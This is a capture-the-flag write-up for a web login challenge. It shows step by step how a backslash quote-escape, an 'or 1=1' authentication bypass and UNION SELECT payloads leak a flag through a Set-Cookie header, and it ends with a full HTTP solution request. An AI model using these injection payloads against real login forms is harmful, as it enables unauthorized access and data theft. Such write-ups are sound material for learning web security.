#### Admin Panel
- points earned: 100
#### Notes / Intuition
- First thing I tried to to was just submit the login form with a random username and password.  Due to an issue on the platform I received the error `Error: (2003, "Can't connect to MySQL server on 'db' ([Errno -3] Temporary failure in name resolution)")`.
- So I already know that there's a MySQL on the backend.
- The next thing I tried was a standard test using `'` for both the username and password.  I received the response 'Not injectable' which indicates that there is some santitization that prevents single quotes.
- Trying to think about this logically, I imagine that perhaps the backend query is something like `select username,password from users where username='meow' and password='bark'`.  So I'm curious if I can use a `\` to escape the 2nd quote in the username.   If I use `\` as the username and `bark` as the password then the query will end up looking like it does below.  This generates an invalid query and I should get a syntax error.
	```sql
	select username,password from users where username='\' and password='bark'
	```
- And I did end up getting the error `Error: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'bark'' at line 1")` which means that an injection did occur.
- So if I use the username `\` and a password `-- -` then this should result in the valid query below.
	```sql
	select username,password from users where username='\' and password='-- -'
	```
- With this input I get the result `No user` which indicates that the backend didn't hate the query.
- Next I wanted to try and bypass the auth.  So I tried username `\` and password ` or 1=1-- -`.  This looked pretty successful as the response was a redirect that also set a cookie `Set-Cookie: username=admin; Path=/`.
- At this point it seems like, at the very least, I should be able to do a blind data exfil, but I wanted to see if I could exfil data without a blind attack(visible data exfil?).  I was curious where the `admin` value came from in the cookie.  I tried submitted the request below, where the hex values represent the strings `bark` and `meow` (quotes are not allowed).  This time the authentication succeeded and I got the cookie `Set-Cookie: username=bark; Path=/`.  This means that I should be able to exfil data via that `Set-Cookie` header.
	```http
	username=\&password= union select 0x6261726b,0x6d656f77-- -
	```
- At this point I started walking down the path of enumerating the DB via the `information_shcema` tables but quickly ran into an error `Uhuuu etooo boro!!`.  After a bit of testing it seemed that this was do to the length of the resulting query.
- At this point, I tried guessing standard CTF solutions.  I wanted to see if there was a `flag` table so i tried the request below which resulted in a successful authentication.  If the flag table did not exist then i would've gotten an SQL error.
	```http
	username=\&password= union select 1,2 from flag-- -
	```
- I then tried a couple common column names like `flag` and `value` and found that querying the `value` column in the `flag` table returned the flag in the `Set-Cookie` header.
#### Solution
```http
POST /login HTTP/1.1
Host: 50.116.19.213:3000
Content-Length: 25
Content-Type: application/x-www-form-urlencoded

username=\&password= union select value,2 from flag-- -
```
- The resulting query will look like
	```sql
	select username,password from users where username='\' and password=' union select value,2 from flag-- -'
	```